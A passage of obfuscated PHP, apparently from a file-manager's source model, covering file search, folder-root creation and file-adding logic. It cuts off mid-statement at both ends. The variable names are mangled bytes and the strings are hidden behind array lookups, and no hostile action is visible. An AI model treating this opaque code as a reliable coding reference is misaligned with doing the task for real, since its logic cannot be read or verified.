$¿™óş¨[$’•¤™½Æ[452]][$’•¤™½Æ[437]] > 1) { return; } $ƒĞëù‘™ = Model($’•¤™½Æ[2447])->listData(); $Ô±ŸãÖë = array(); $‹ÔúÆÔå = $«À’î¢®[$’•¤™½Æ[2276]]; foreach ($ƒĞëù‘™ as $íÍº ö) { $ã¥–ßˆÈ = $íÍº ö[$’•¤™½Æ[42]]; $Ô³¢œŸ’ = str_replace($’•¤™½Æ[63], $’•¤™½Æ[12], Pinyin::get($ã¥–ßˆÈ)); if (stripos($ã¥–ßˆÈ, $‹ÔúÆÔå) !== !1 || stripos($Ô³¢œŸ’, $‹ÔúÆÔå) !== !1) { $Ô±ŸãÖë[] = $íÍº ö[$’•¤™½Æ[496]]; } } if (!$Ô±ŸãÖë) { return; } $¤²±ªˆ = array($’•¤™½Æ[524] => array($’•¤™½Æ[7], $Ô±ŸãÖë), $’•¤™½Æ[1588] => USER_ID); $Äé­õ‚û = Model($’•¤™½Æ[526])->field($’•¤™½Æ[97])->where($¤²±ªˆ)->select(); $Äé­õ‚û = array_to_keyvalue($Äé­õ‚û, $’•¤™½Æ[12], $’•¤™½Æ[97]); $Ê›üˆ = array_unique($Äé­õ‚û); $this->_listSearchMerge($¿™óş¨, $«À’î¢®, $¤·ášìÅ, $Ê›üˆ); } private function _listSearchDesc(&$ÑÓäÉ·, $ùÄ†¨‘Ü, $¦ÈôÕ…İ) { $÷µ’„£· =& $_SERVER[øşô´çË]; if (empty($ùÄ†¨‘Ü[$÷µ’„£·[2139]]) || !in_array($÷µ’„£·[549], $ùÄ†¨‘Ü[$÷µ’„£·[2139]])) { return; } if (!$ùÄ†¨‘Ü[$÷µ’„£·[2276]] || $ÑÓäÉ·[$÷µ’„£·[452]][$÷µ’„£·[437]] > 1) { return; } $ìÅê…ˆ = array($÷µ’„£·[105] => $÷µ’„£·[549], $÷µ’„£·[460] => array($÷µ’„£·[482], $÷µ’„£·[2278] . $ùÄ†¨‘Ü[$÷µ’„£·[2276]] . $÷µ’„£·[2278])); $ÔïçşÙÎ = !1; if ($ÔïçşÙÎ) { $¿’ÄÂ„ = $this->listSearchChildren($ùÄ†¨‘Ü[$÷µ’„£·[200]]); $¿’ÄÂ„ = array_unique($¿’ÄÂ„); if (!$¿’ÄÂ„) { return; } $ìÅê…ˆ[$÷µ’„£·[201]] = array($÷µ’„£·[7], $¿’ÄÂ„); } $…‚‹íÔŠ = Model($÷µ’„£·[480])->field($÷µ’„£·[201])->where($ìÅê…ˆ)->limit(5000)->select(); $âóã±à  = array_to_keyvalue($…‚‹íÔŠ, $÷µ’„£·[12], $÷µ’„£·[201]); $this->_listSearchMerge($ÑÓäÉ·, $ùÄ†¨‘Ü, $¦ÈôÕ…İ, $âóã±à ); } private function _listSearchGroupTag(&$ÌËÚ÷÷—, $ª¦…ïª, $ŸÊÇ…á) { $¯ˆ©×Û =& $_SERVER[øşô´çË]; if (empty($ª¦…ïª[$¯ˆ©×Û[2139]]) || !in_array($¯ˆ©×Û[2446], $ª¦…ïª[$¯ˆ©×Û[2139]])) { return; } if (!$ª¦…ïª[$¯ˆ©×Û[2276]] || $ÌËÚ÷÷—[$¯ˆ©×Û[452]][$¯ˆ©×Û[437]] > 1 || !$ª¦…ïª[$¯ˆ©×Û[200]]) { return; } $©îÆŸ· = $this->sourceInfo($ª¦…ïª[$¯ˆ©×Û[200]]); if (!$©îÆŸ· || $©îÆŸ·[$¯ˆ©×Û[198]] != SourceModel::TYPE_GROUP) { return; } $ßÕüˆ†Ó = $©îÆŸ·[$¯ˆ©×Û[598]]; $‰ïëÁŠã = Model($¯ˆ©×Û[2448])->get($ßÕüˆ†Ó); $ÔØ¯öõö = array(); $úñú«“’ = $ª¦…ïª[$¯ˆ©×Û[2276]]; foreach ($‰ïëÁŠã[$¯ˆ©×Û[455]] as $ËÄø›Ç) { $·ã‰Ö¾ = $ËÄø›Ç[$¯ˆ©×Û[42]]; $ßóúÂ˜Æ = str_replace($¯ˆ©×Û[63], $¯ˆ©×Û[12], Pinyin::get($·ã‰Ö¾)); if (stripos($·ã‰Ö¾, $úñú«“’) !== !1 || stripos($ßóúÂ˜Æ, $úñú«“’) !== !1) { $ÔØ¯öõö[] = $ËÄø›Ç[$¯ˆ©×Û[496]]; } } if (!$ÔØ¯öõö) { return; } $è¼øòûî = array($¯ˆ©×Û[524] => array($¯ˆ©×Û[7], $ÔØ¯öõö), $¯ˆ©×Û[1588] => 0, $¯ˆ©×Û[43] => $¯ˆ©×Û[1487] . $ßÕüˆ†Ó); $èüÛ¬ÎÈ = Model($¯ˆ©×Û[526])->field($¯ˆ©×Û[97])->where($è¼øòûî)->select(); $èüÛ¬ÎÈ = array_to_keyvalue($èüÛ¬ÎÈ, $¯ˆ©×Û[12], $¯ˆ©×Û[97]); $š„ï—±» = array_unique($èüÛ¬ÎÈ); $this->_listSearchMerge($ÌËÚ÷÷—, $ª¦…ïª, $ŸÊÇ…á, $š„ï—±»); } private function _listSearchMerge(&$Ö´™ûÔÑ, $»è¼Ó„, $ÄÛ€•é¸, $ÃÑ¹²ÁŞ) { $„ÔŒ¥‡± =& $_SERVER[øşô´çË]; if (!$ÃÑ¹²ÁŞ) { return; } $¹íÙÄ‡ = array_to_keyvalue($Ö´™ûÔÑ[$„ÔŒ¥‡±[455]], $„ÔŒ¥‡±[12], $„ÔŒ¥‡±[201]); $İ÷Ìş¼Ö = array_diff($ÃÑ¹²ÁŞ, $¹íÙÄ‡); if (!$İ÷Ìş¼Ö) { return; } $Œ€É¨¨ = array($„ÔŒ¥‡±[201] => array($„ÔŒ¥‡±[7], $İ÷Ìş¼Ö)); $ä¹Ÿ“² = $this->field($ÄÛ€•é¸)->where($Œ€É¨¨)->select(); if (!$ä¹Ÿ“²) { return; } $ŠÜÙŸ§ª = array(); foreach ($ä¹Ÿ“² as $åò‚¼² ) { if ($this->_listSearchFilter($åò‚¼² , $»è¼Ó„)) { $ŠÜÙŸ§ª[] = $åò‚¼² ; } } $Ö´™ûÔÑ[$„ÔŒ¥‡±[455]] = array_merge($ŠÜÙŸ§ª, $Ö´™ûÔÑ[$„ÔŒ¥‡±[455]]); $Ö´™ûÔÑ[$„ÔŒ¥‡±[452]][$„ÔŒ¥‡±[453]] += count($ŠÜÙŸ§ª); } private function _listSearchFilter($ç•”šà, $¼åÉó–Ë) { $†Ï°Ï«Ÿ =& $_SERVER[øşô´çË]; $©‘¨ç¯¢ = $ç•”šà[$†Ï°Ï«Ÿ[509]] == $†Ï°Ï«Ÿ[101]; if (!strstr($ç•”šà[$†Ï°Ï«Ÿ[613]], $†Ï°Ï«Ÿ[60] . $¼åÉó–Ë[$†Ï°Ï«Ÿ[200]] . $†Ï°Ï«Ÿ[60])) { return !1; } if (isset($¼åÉó–Ë[$†Ï°Ï«Ÿ[510]]) && $¼åÉó–Ë[$†Ï°Ï«Ÿ[510]] != $†Ï°Ï«Ÿ[946]) { if ($¼åÉó–Ë[$†Ï°Ï«Ÿ[510]] == $†Ï°Ï«Ÿ[88] && !$©‘¨ç¯¢) { return !1; } if ($¼åÉó–Ë[$†Ï°Ï«Ÿ[510]] != $†Ï°Ï«Ÿ[88] && $©‘¨ç¯¢) { return !1; } if (!strstr($ç•”šà[$†Ï°Ï«Ÿ[176]], $†Ï°Ï«Ÿ[60] . $¼åÉó–Ë[$†Ï°Ï«Ÿ[510]] . $†Ï°Ï«Ÿ[60])) { return !1; } } if (isset($¼åÉó–Ë[$†Ï°Ï«Ÿ[2449]]) && $¼åÉó–Ë[$†Ï°Ï«Ÿ[2449]] < $ç•”šà[$†Ï°Ï«Ÿ[89]]) { return !1; } if (isset($¼åÉó–Ë[$†Ï°Ï«Ÿ[2450]]) && $¼åÉó–Ë[$†Ï°Ï«Ÿ[2450]] > $ç•”šà[$†Ï°Ï«Ÿ[89]]) { return !1; } if (isset($¼åÉó–Ë[$†Ï°Ï«Ÿ[693]]) && $¼åÉó–Ë[$†Ï°Ï«Ÿ[693]] != $ç•”šà[$†Ï°Ï«Ÿ[552]]) { return !1; } return !0; } public function listSearchChildren($µäÓ¡ ¹, $êÆ¤ƒ—™ = 5000) { $óÛğÜó„ =& $_SERVER[øşô´çË]; $Î¶Üà´’ = array(); $şì³à” = $this->sourceInfo($µäÓ¡ ¹); $ùĞË×°Ò = array($óÛğÜó„[613] => array($óÛğÜó„[482], $şì³à”[$óÛğÜó„[613]] . $şì³à”[$óÛğÜó„[201]] . $óÛğÜó„[645])); $ Š·Ööğ = $this->field($óÛğÜó„[89])->where($ùĞË×°Ò)->limit($êÆ¤ƒ—™ + 1)->select(); $şàÄ©èÎ = is_array($ Š·Ööğ) ? count($ Š·Ööğ) : 0; if ($şàÄ©èÎ > $êÆ¤ƒ—™) { return $this->listChildrenDeep($µäÓ¡ ¹, $êÆ¤ƒ—™, 3); } $»Š†¾ = $this->field($óÛğÜó„[201])->where($ùĞË×°Ò)->select(); $Î¶Üà´’ = array_to_keyvalue($»Š†¾, $óÛğÜó„[12], $óÛğÜó„[201]); return $Î¶Üà´’; } public function listChildrenDeep($Ü‰´êÊ, $¶›Ôí§ï, $©á¸ıæ = 3) { $¼¼Ü¦´ =& $_SERVER[øşô´çË]; $è›ÖÈğà = array(); $Û‚¿å = array($Ü‰´êÊ); for ($£Ÿ›îõ“ = 0; $£Ÿ›îõ“ < $©á¸ıæ; $£Ÿ›îõ“++) { $÷ÊáøÃ× = array($¼¼Ü¦´[200] => array($¼¼Ü¦´[7], $Û‚¿å)); $ã™«ŞÈÈ = $this->field($¼¼Ü¦´[2451])->where($÷ÊáøÃ×)->select(); $Û‚¿å = array_to_keyvalue(array_filter_by_field($ã™«ŞÈÈ, $¼¼Ü¦´[509], $¼¼Ü¦´[101]), $¼¼Ü¦´[12], $¼¼Ü¦´[201]); $è›ÖÈğà = array_merge($è›ÖÈğà, array_to_keyvalue($ã™«ŞÈÈ, $¼¼Ü¦´[12], $¼¼Ü¦´[201])); if (!$Û‚¿å || count($è›ÖÈğà) >= $¶›Ôí§ï) { break; } } return array_slice($è›ÖÈğà, 0, intval($¶›Ôí§ï)); } private function _listSearchBindPinyin($ïÅ³††§, &$¤ÇğÎèõ, &$ùİ¿ÅÍ„) { $Øªå×—¨ =& $_SERVER[øşô´çË]; if (!isset($ïÅ³††§[$Øªå×—¨[2276]]) || !$ïÅ³††§[$Øªå×—¨[2276]]) { return; } if (!Input::check($ïÅ³††§[$Øªå×—¨[2276]], $Øªå×—¨[402]) || strlen($ïÅ³††§[$Øªå×—¨[2276]]) < 2) { return; } $åÊİîîê = "\114\x45\x46\x54\40\x4a\117\x49\116\40{$this->tablePrefix}\151\x6f\x5f\163\157\x75\162\x63\x65\x5f\155\145\164\x61\x20\x6d\145\x74\141\40\157\x6e\x20\x73\157\x75\162\x63\145\56\163\x6f\165\162\x63\x65\x49\x44\40\75\40\155\x65\164\x61\x2e\163\x6f\165\162\x63\x65\111\104"; $ˆÓ›Ø¶‚ = array(); $ùİ¿ÅÍ„ = str_replace(array($Øªå×—¨[19], $Øªå×—¨[63], $Øªå×—¨[2452]), $Øªå×—¨[12], $ùİ¿ÅÍ„); $ùİ¿ÅÍ„ = $Øªå×—¨[534] . str_replace($Øªå×—¨[60], $Øªå×—¨[535], $ùİ¿ÅÍ„); $ú„£¦íØ = $¤ÇğÎèõ[$Øªå×—¨[42]]; unset($¤ÇğÎèõ[$Øªå×—¨[42]]); foreach ($¤ÇğÎèõ as $–‹”«ë => $í®—µŸ¼) { $ˆÓ›Ø¶‚[$Øªå×—¨[534] . $–‹”«ë] = $í®—µŸ¼; } foreach ($ú„£¦íØ as $æèæüõÁ) { $ˆÓ›Ø¶‚[] = array($Øªå×—¨[539] => $æèæüõÁ, $Øªå×—¨[1164] => $Øªå×—¨[2280], array($Øªå×—¨[2453] => $æèæüõÁ, $Øªå×—¨[2454] => array($Øªå×—¨[7], array($Øªå×—¨[561], $Øªå×—¨[560])))); } $this->join($åÊİîîê); $¤ÇğÎèõ = $ˆÓ›Ø¶‚; } private function _parseSearchWhere($ŞÕÔ“Ôé) { $ˆ¹æâÌ =& $_SERVER[øşô´çË]; $úßò·Ë¨ = array(); if (isset($ŞÕÔ“Ôé[$ˆ¹æâÌ[863]]) && $ŞÕÔ“Ôé[$ˆ¹æâÌ[863]]) { $úßò·Ë¨[$ˆ¹æâÌ[98]] = array($ˆ¹æâÌ[2455], $ŞÕÔ“Ôé[$ˆ¹æâÌ[863]]); } if (isset($ŞÕÔ“Ôé[$ˆ¹æâÌ[864]]) && $ŞÕÔ“Ôé[$ˆ¹æâÌ[864]]) { $á¾‚¿¶„ = array($ˆ¹æâÌ[2456], $ŞÕÔ“Ôé[$ˆ¹æâÌ[864]]); if ($úßò·Ë¨[$ˆ¹æâÌ[98]]) { $úßò·Ë¨[$ˆ¹æâÌ[98]] = array($úßò·Ë¨[$ˆ¹æâÌ[98]], $á¾‚¿¶„, $ˆ¹æâÌ[2457]); } else { $úßò·Ë¨[$ˆ¹æâÌ[98]] = $á¾‚¿¶„; } } if (isset($ŞÕÔ“Ôé[$ˆ¹æâÌ[2449]]) && $ŞÕÔ“Ôé[$ˆ¹æâÌ[2449]] > 0) { $úßò·Ë¨[$ˆ¹æâÌ[89]] = array($ˆ¹æâÌ[2455], $ŞÕÔ“Ôé[$ˆ¹æâÌ[2449]]); } if (isset($ŞÕÔ“Ôé[$ˆ¹æâÌ[2450]]) && $ŞÕÔ“Ôé[$ˆ¹æâÌ[2450]]) { $á¾‚¿¶„ = array($ˆ¹æâÌ[2456], $ŞÕÔ“Ôé[$ˆ¹æâÌ[2450]]); if ($úßò·Ë¨[$ˆ¹æâÌ[89]]) { $úßò·Ë¨[$ˆ¹æâÌ[89]] = array($úßò·Ë¨[$ˆ¹æâÌ[89]], $á¾‚¿¶„, $ˆ¹æâÌ[2457]); } else { $úßò·Ë¨[$ˆ¹æâÌ[89]] = $á¾‚¿¶„; } } if (isset($ŞÕÔ“Ôé[$ˆ¹æâÌ[693]]) && $ŞÕÔ“Ôé[$ˆ¹æâÌ[693]]) { $úßò·Ë¨[] = array($ˆ¹æâÌ[552] => $ŞÕÔ“Ôé[$ˆ¹æâÌ[693]], $ˆ¹æâÌ[550] => $ŞÕÔ“Ôé[$ˆ¹æâÌ[693]], $ˆ¹æâÌ[1164] => $ˆ¹æâÌ[2280]); } if (isset($ŞÕÔ“Ôé[$ˆ¹æâÌ[510]]) && $ŞÕÔ“Ôé[$ˆ¹æâÌ[510]]) { $ç¸‹¬ = $ŞÕÔ“Ôé[$ˆ¹æâÌ[510]]; if ($ç¸‹¬ == $ˆ¹æâÌ[88]) { $úßò·Ë¨[$ˆ¹æâÌ[509]] = 1; } else { if ($ç¸‹¬ == $ˆ¹æâÌ[2458]) { $úßò·Ë¨[$ˆ¹æâÌ[509]] = 0; } else { if ($ç¸‹¬) { $ç¸‹¬ = is_array($ç¸‹¬) ? $ç¸‹¬ : explode($ˆ¹æâÌ[60], $ç¸‹¬); $úßò·Ë¨[$ˆ¹æâÌ[510]] = array($ˆ¹æâÌ[516], $ç¸‹¬); $úßò·Ë¨[$ˆ¹æâÌ[509]] = 0; } } } } $this->_parseSearchParent($ŞÕÔ“Ôé, $úßò·Ë¨); if (isset($ŞÕÔ“Ôé[$ˆ¹æâÌ[2276]]) && trim($ŞÕÔ“Ôé[$ˆ¹æâÌ[2276]])) { $åè‘ïì = trim($ŞÕÔ“Ôé[$ˆ¹æâÌ[2276]]); $…ôğ¦Õ£ = explode($ˆ¹æâÌ[63], $åè‘ïì); if (strlen($åè‘ïì) > 2 && (substr($åè‘ïì, 0, 1) == $ˆ¹æâÌ[128] && substr($åè‘ïì, -1) == $ˆ¹æâÌ[128]) || substr($åè‘ïì, 0, 1) == $ˆ¹æâÌ[68] && substr($åè‘ïì, -1) == $ˆ¹æâÌ[68]) { $åè‘ïì = substr($åè‘ïì, 1, -1); $…ôğ¦Õ£ = array($åè‘ïì); } $úßò·Ë¨[$ˆ¹æâÌ[42]] = array(array($ˆ¹æâÌ[644], $ˆ¹æâÌ[2278] . $åè‘ïì . $ˆ¹æâÌ[2278])); if (count($…ôğ¦Õ£) > 1) { $úßò·Ë¨[$ˆ¹æâÌ[42]] = array(); foreach ($…ôğ¦Õ£ as $º‹Ì’öë) { if (!trim($º‹Ì’öë)) { continue; } $úßò·Ë¨[$ˆ¹æâÌ[42]][] = array($ˆ¹æâÌ[644], $ˆ¹æâÌ[2278] . trim($º‹Ì’öë) . $ˆ¹æâÌ[2278]); } } } return $úßò·Ë¨; } private function _parseSearchParent($Â‚ùÌñ, &$°€çôºÔ) { $Û¹€ü¹… =& $_SERVER[øşô´çË]; if (!isset($Â‚ùÌñ[$Û¹€ü¹…[200]]) || !$Â‚ùÌñ[$Û¹€ü¹…[200]]) { return; } $„¨¾Ó¢• = $this->pathInfo($Â‚ùÌñ[$Û¹€ü¹…[200]]); $¬óÒİœŠ = $„¨¾Ó¢•[$Û¹€ü¹…[200]] . $Û¹€ü¹…[12] === $Û¹€ü¹…[238]; $Ëä“‚Ğ = $„¨¾Ó¢•[$Û¹€ü¹…[198]] == $Û¹€ü¹…[607]; if ($„¨¾Ó¢•[$Û¹€ü¹…[623]] == $Û¹€ü¹…[624]) { $àş¤Ô ª = $this->sourceInfo($Â‚ùÌñ[$Û¹€ü¹…[200]]); $„¨¾Ó¢•[$Û¹€ü¹…[613]] = $àş¤Ô ª[$Û¹€ü¹…[613]]; } $°€çôºÔ[$Û¹€ü¹…[683]] = array($Û¹€ü¹…[644], $„¨¾Ó¢•[$Û¹€ü¹…[613]] . $Â‚ùÌñ[$Û¹€ü¹…[200]] . $Û¹€ü¹…[645]); $ÌæğÇÒê = isset($Â‚ùÌñ[$Û¹€ü¹…[2139]]) && in_array($Û¹€ü¹…[607], $Â‚ùÌñ[$Û¹€ü¹…[2139]]); if (!$ÌæğÇÒê || !$Ëä“‚Ğ || !$¬óÒİœŠ || !$„¨¾Ó¢•[$Û¹€ü¹…[511]]) { return; } if (!AuthModel::authCheckRoot($„¨¾Ó¢•[$Û¹€ü¹…[511]][$Û¹€ü¹…[512]])) { return; } $Å©‰Ÿü = $„¨¾Ó¢•[$Û¹€ü¹…[598]] . $Û¹€ü¹…[12]; if ($Å©‰Ÿü == $Û¹€ü¹…[101]) { unset($°€çôºÔ[$Û¹€ü¹…[683]]); $°€çôºÔ[$Û¹€ü¹…[198]] = self::TYPE_GROUP; return; } $ñëËõ = Model($Û¹€ü¹…[614])->groupChildrenAll($Å©‰Ÿü); $æ¤¿÷š = count($ñëËõ); if ($æ¤¿÷š <= 1) { return; } $ºÔØ¹¯ = array($Û¹€ü¹…[200] => 0, $Û¹€ü¹…[198] => self::TYPE_GROUP, $Û¹€ü¹…[598] => array($Û¹€ü¹…[7], $ñëËõ)); $¯»Ø ÁÍ = $this->field($Û¹€ü¹…[2459])->where($ºÔØ¹¯)->limit($æ¤¿÷š)->select(); $°€çôºÔ[$Û¹€ü¹…[683]] = array(); foreach ($¯»Ø ÁÍ as $˜•“Î½õ) { $°€çôºÔ[$Û¹€ü¹…[683]][] = array($Û¹€ü¹…[644], $Û¹€ü¹…[622] . $˜•“Î½õ[$Û¹€ü¹…[201]] . $Û¹€ü¹…[645]); } $°€çôºÔ[$Û¹€ü¹…[683]][] = $Û¹€ü¹…[2280]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($á—î‹ßÔ) { $ãşí¿» =& $_SERVER[øşô´çË]; $­ğûŸî = Model($ãşí¿»[606])->where(array($ãşí¿»[1964] => $á—î‹ßÔ))->find(); $­ÌÏ âú = $this->_mkdirRoot(SourceModel::TYPE_USER, $á—î‹ßÔ, $­ğûŸî[$ãşí¿»[42]]); $this->userDesktopAdd($­ÌÏ âú); return $­ÌÏ âú; } public function userDesktopAdd($ôó²ˆà¾) { $ÎÌúáÊò =& $_SERVER[øşô´çË]; $¥çÚÅ§û = LNG($ÎÌúáÊò[2460]); $Ëğ¹íºÊ = $this->mkdir($ôó²ˆà¾, $¥çÚÅ§û); $this->metaSet($Ëğ¹íºÊ, $ÎÌúáÊò[2461], $ÎÌúáÊò[101]); $this->metaSet($ôó²ˆà¾, $ÎÌúáÊò[2462], $Ëğ¹íºÊ); } public function userPathSafeAdd($ü¦Á…âß) { $ËØ… Õˆ =& $_SERVER[øşô´çË]; $üë†÷øä = Model($ËØ… Õˆ[606])->getInfoFull($ü¦Á…âß); if (!$üë†÷øä) { return !1; } if (_get($üë†÷øä, $ËØ… Õˆ[627])) { return $üë†÷øä[$ËØ… Õˆ[564]][$ËØ… Õˆ[2463]]; } $¬ğ•ĞÂÆ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ü¦Á…âß, $ËØ… Õˆ[2464], $ËØ… Õˆ[2465]); Model($ËØ… Õˆ[606])->metaSet($ü¦Á…âß, $ËØ… Õˆ[2463], $¬ğ•ĞÂÆ); $this->metaSet($¬ğ•ĞÂÆ, $ËØ… Õˆ[2466], $ü¦Á…âß); return $¬ğ•ĞÂÆ; } public function userPathAppAdd($Ş¤Á‘Ëî, $±µ¬µş­ = '', $æ•Òê·å = '') { $ÎØ…í—¿ =& $_SERVER[øşô´çË]; $ªÈè¬‡Ù = Model($ÎØ…í—¿[606])->getInfoFull($Ş¤Á‘Ëî); if (!$ªÈè¬‡Ù) { return !1; } $¼ü²äòº = $ªÈè¬‡Ù[$ÎØ…í—¿[564]] ? $ªÈè¬‡Ù[$ÎØ…í—¿[564]] : array(); $æñÏ¹ˆ = $¼ü²äòº[$ÎØ…í—¿[2467]]; if (!$æñÏ¹ˆ) { $æñÏ¹ˆ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ş¤Á‘Ëî, $ÎØ…í—¿[2468], $ÎØ…í—¿[2469]); Model($ÎØ…í—¿[606])->metaSet($Ş¤Á‘Ëî, $ÎØ…í—¿[2467], $æñÏ¹ˆ . $ÎØ…í—¿[12]); $this->metaSet($æñÏ¹ˆ, $ÎØ…í—¿[2467], $Ş¤Á‘Ëî); } if (!$±µ¬µş­) { return $æñÏ¹ˆ; } $ªÙÑ°› = $¼ü²äòº[$ÎØ…í—¿[2470] . $±µ¬µş­]; if (!$ªÙÑ°›) { $ªÙÑ°› = $this->mkdir($æñÏ¹ˆ, $±µ¬µş­); Model($ÎØ…í—¿[606])->metaSet($Ş¤Á‘Ëî, $ÎØ…í—¿[2470] . $±µ¬µş­, $ªÙÑ°›); $this->metaSet($ªÙÑ°›, $ÎØ…í—¿[2470] . $±µ¬µş­, $Ş¤Á‘Ëî); } if (!$æ•Òê·å) { return $ªÙÑ°›; } $İˆçíà = $this->mkdir($ªÙÑ°›, $æ•Òê·å); return $İˆçíà; } public function groupRootAdd($Û¡ù’……) { $ÄÅŒ»üÅ =& $_SERVER[øşô´çË]; $Öæüä§Ö = Model($ÄÅŒ»üÅ[614])->where(array($ÄÅŒ»üÅ[2265] => $Û¡ù’……))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Û¡ù’……, $Öæüä§Ö[$ÄÅŒ»üÅ[42]]); } public function systemRootPathAdd($ÂàÖÃõ) { if ($ÂàÖÃõ != $_SERVER[øşô´çË][637]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÂàÖÃõ); } public function userRootRemove($öÄ´Ğƒè) { $ƒµÃ–Ö = $this->targetSourceRoot(SourceModel::TYPE_USER, $öÄ´Ğƒè, !0); foreach ($ƒµÃ–Ö as $¿ÚãÊñ) { if (!$¿ÚãÊñ) { continue; } $this->remove($¿ÚãÊñ[$_SERVER[øşô´çË][201]], !1); } } public function groupRootRemove($×³Ÿ„š) { $ŸúœªüÉ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $×³Ÿ„š); if (!$ŸúœªüÉ) { return; } $this->remove($ŸúœªüÉ[$_SERVER[øşô´çË][201]], !1); } private function _mkdirRoot($„´ø©•Æ, $ğ¹ö¬ä, $’©™ìé¾, $¹Úş„Ğä = '') { $ûƒğõ°¢ =& $_SERVER[øşô´çË]; $ÕŸÛ = KodUser::id(); $²¢ÖÑ’ = array($ûƒğõ°¢[501] => 0, $ûƒğõ°¢[679] => $„´ø©•Æ, $ûƒğõ°¢[680] => $ğ¹ö¬ä, $ûƒğõ°¢[677] => 1, $ûƒğõ°¢[681] => $ÕŸÛ, $ûƒğõ°¢[682] => $ÕŸÛ, $ûƒğõ°¢[678] => $¹Úş„Ğä, $ûƒğõ°¢[683] => $ûƒğõ°¢[622], $ûƒğõ°¢[528] => 0, $ûƒğõ°¢[649] => 0, $ûƒğõ°¢[567] => 0, $ûƒğõ°¢[684] => $ûƒğõ°¢[12]); if ($¸û×¡˜ß = $this->where($²¢ÖÑ’)->find()) { return $¸û×¡˜ß[$ûƒğõ°¢[201]]; } $¸¹ñÄş = "\x4d\x6f\144\145\154\x53\x6f\165\x72\x63\145\x2e\155\x6b\x64\x69\162\122\x6f\x6f\164\x2e{$„´ø©•Æ}\x2e{$ğ¹ö¬ä}\x2e" . $’©™ìé¾; CacheLock::lock($¸¹ñÄş); $²¢ÖÑ’[$ûƒğõ°¢[42]] = $’©™ìé¾; $ÌÚì£‚ = $this->add($²¢ÖÑ’); $±²Ø‚¥Å = array($ûƒğõ°¢[685] => short_id($ÌÚì£‚)); $this->where(array($ûƒğõ°¢[515] => $ÌÚì£‚))->save($±²Ø‚¥Å); CacheLock::unlock($¸¹ñÄş); return $ÌÚì£‚; } private function targetSourceRoot($ÛöÂÀ¿, $›¦ÛîØ, $ìóéŞä‡ = false) { $Öííæí =& $_SERVER[øşô´çË]; $‰ ×©‡ş = array($Öííæí[501] => 0, $Öííæí[679] => $ÛöÂÀ¿, $Öííæí[680] => $›¦ÛîØ); if ($ìóéŞä‡) { $†êŸœ‚ = $this->where($‰ ×©‡ş)->select(); return $†êŸœ‚ ? $†êŸœ‚ : array(); } $©á§¿ = $this->where($‰ ×©‡ş)->find(); return $©á§¿ ? $©á§¿ : array(); } public function sourceRootGroup($ÛÀÛ¼‰) { $èµîÛèñ =& $_SERVER[øşô´çË]; if (is_string($ÛÀÛ¼‰)) { $ÛÀÛ¼‰ = array($ÛÀÛ¼‰); } $ııŒŞÃ× = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÛÀÛ¼‰, $èµîÛèñ[230]); $°½ğ£“ = array($èµîÛèñ[455] => $ııŒŞÃ×, $èµîÛèñ[452] => array($èµîÛèñ[861] => count($ÛÀÛ¼‰))); $this->_listDataApply($°½ğ£“[$èµîÛèñ[455]]); $this->_listMake($°½ğ£“); return array_to_keyvalue($°½ğ£“[$èµîÛèñ[95]], $èµîÛèñ[598]); } public function mkfile($àƒßÔµ“, $Ô˜º¨Ï¨, $ÕŒ½æ»ß = '', $æ¤ûÛ³Ü = REPEAT_RENAME) { $ãù¼¶êå =& $_SERVER[øşô´çË]; $ºğïü¹Ş = KodIO::ioFileDriverGet($ãù¼¶êå[507] . $àƒßÔµ“ . $ãù¼¶êå[411]); $ğ‰òæŸ¦ = Model($ãù¼¶êå[705])->addFileByContent($ÕŒ½æ»ß, $ºğïü¹Ş, $Ô˜º¨Ï¨); return $this->_createFileCall($àƒßÔµ“, $Ô˜º¨Ï¨, $ğ‰òæŸ¦, $æ¤ûÛ³Ü, $ãù¼¶êå[1538]); } public function addFile($ÛËòÇÑü, $Ø±Çê¿›, $µØÊ‡•‰, $ÇêÆ¬§ = false, $’ç„Ç¢‹ = REPEAT_RENAME) { $Ø‘Ïê” =& $_SERVER[øşô´çË]; $–´ïã¨ = KodIO::ioFileDriverGet($Ø‘Ïê”[507] . $ÛËòÇÑü . $Ø‘Ïê”[411]); $ºíå‹Î = Model($Ø‘Ïê”[705])->addFile($Ø±Çê¿›, $–´ïã¨, $µØÊ‡•‰, $ÇêÆ¬§); return $this->_createFileCall($ÛËòÇÑü, $µØÊ‡•‰, $ºíå‹Î, $’ç„Ç¢‹); } public function addFileByFileID($ŞÈ„‰èŞ, $ŸÑÊ¬²«, $ò¯—¶¾, $Ş‘”ãëŞ = REPEAT_RENAME) { $óÛË¾ÄÖ =& $_SERVER[øşô´çË]; $»½ß«î¾ = Model($óÛË¾ÄÖ[705])->find($ŸÑÊ¬²«); Model($óÛË¾ÄÖ[705])->linkAdd($ŸÑÊ¬²«); return $this->_createFileCall($ŞÈ„‰èŞ, $ò¯—¶¾, $»½ß«î¾, $Ş‘”ãëŞ); } public function addFileByRemote($ˆµ™îÔî, $’¬šË”, $ØÁüÄÊä, $Æ–Ú„“Ä = array(), $©µ×¥¼ = REPEAT_RENAME) { $Óµ³ÕÇ¢ = Model($_SERVER[øşô´çË][705])->addFileByRemote($’¬šË”, $ØÁüÄÊä, $Æ–Ú„“Ä); return $this->_createFileCall($ˆµ™îÔî, $ØÁüÄÊä, $Óµ³ÕÇ¢, $©µ×¥¼); } private function _createFileCall($û£ü¯Ñ, $ß²ù’¢µ, $‹ĞÙ³ï¹, $Ô¤è°Î‚, $´Íš ²Ó = "\x75\160\x6c\157\x61\144") { $Å×äÒ’ =& $_SERVER[øşô´çË]; if (!$‹ĞÙ³ï¹) { return !1; } $°ò¶©ó„ = !1; $this->setMasterDB(); $this->lockWriteStart($û£ü¯Ñ, $ß²ù’¢µ); $íºØçÎ = $this->fileNameExist($û£ü¯Ñ, $ß²ù’¢µ); $Ÿ„Êƒş» = $this->_createFile($û£ü¯Ñ, $ß²ù’¢µ, $‹ĞÙ³ï¹, $Ô¤è°Î‚, $°ò¶©ó„); if (!$°ò¶©ó„) { Model($Å×äÒ’[569])->remove($‹ĞÙ³ï¹[$Å×äÒ’[566]]); } if ($°ò¶©ó„ && $Ÿ„Êƒş» && $Ÿ„Êƒş» != 